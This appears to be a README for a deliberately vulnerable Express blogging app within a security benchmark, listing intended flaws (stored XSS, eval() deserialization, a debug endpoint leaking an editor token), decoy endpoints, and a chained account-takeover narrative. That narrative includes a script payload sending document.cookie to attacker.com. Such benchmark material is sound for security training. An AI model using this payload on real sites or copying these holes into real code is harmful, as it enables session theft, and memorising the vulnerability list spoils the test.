# Content Management System

## Overview
A JavaScript Express application representing a blogging engine where users can register, write articles, customize layout templates, and publish comments.

## Business Domain
Publishing & Content Management

## Tech Stack
- JavaScript (Node.js)
- Express
- SQLite (in-memory)

## Features
- User registration and login
- Add comments to blog posts (vulnerable to Stored XSS)
- Publish blog articles (vulnerable to insecure deserialization in layout customizer)
- Escaped post titles lookup (Decoy: HTML escape protection)
- System diagnostic status check (vulnerable to token leak in debug config)

## Security Benchmarking
The vulnerabilities in this application are intentional. Refer to [.vulns](file:///d:/work/secure-code-hunt/apps/javascript/app-19-cms/.vulns) for the complete list of vulnerability targets.

---

## Chained Vulnerability Scenario

### Chain: "Diagnostics Configuration Disclosure → Admin session hijacking via Stored XSS"

An attacker queries the diagnostics API to leak the editor token, logs in to post a malicious comment script, and steals the editor's cookie when they review post comments.

| Step | Issue | Severity (standalone) | OWASP | Location |
|------|-------|-----------------------|-------|----------|
| 1 | Debug status leaks editor token key | Medium | A05 | `src/index.js` → `GET /api/system/diagnostics` |
| 2 | Comment retrieval renders raw XSS tags | High | A03 | `src/index.js` → `GET /api/posts/:id/comments` |

**Attack narrative**:
1. The attacker queries `/api/system/diagnostics?debug=true` to obtain the editor token `CMS-ADMIN-EDITOR-KEY-xyz9988`.
2. Using this token in the headers, they bypass standard login filters.
3. The attacker posts a comment containing a script tag to steal active user cookies: `<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>`.
4. The administrator visits the post comment management panel.
5. The script runs in the admin's browser, hijacking their active session cookie.

**Combined Impact**: `account_takeover` — Attacker hijacks victim administrator accounts.

---

## API Endpoints

| Method | Path | Auth | Description |
|--------|------|------|-------------|
| POST   | `/api/auth/register` | None | Register new author account |
| POST   | `/api/auth/login` | None | Authenticate reviewer |
| POST   | `/api/auth/logout` | Session | Clear session |
| POST   | `/api/posts` | Session / Token | Create a post (vulnerable to insecure eval() deserialization) |
| POST   | `/api/posts/safe` | Session / Token | Create a post safely (Decoy: JSON.parse) |
| GET    | `/api/posts/:id` | None | View blog article (Decoy: HTML title escaping) |
| GET    | `/api/posts/:id/comments` | None | View post comments (vulnerable to Stored XSS) |
| POST   | `/api/posts/:id/comments` | None | Submit a comment |
| GET    | `/api/system/diagnostics` | None | Verify server logs (vulnerable to key leak) |

## Running Locally

1. Install dependencies:
   ```bash
   npm install
   ```
2. Start the application:
   ```bash
   npm start
   ```
3. The server runs on port `8019`.

## Running via Docker

1. Build the image:
   ```bash
   docker build -t app-19-cms .
   ```
2. Run the container:
   ```bash
   docker run -p 8019:8019 app-19-cms
   ```
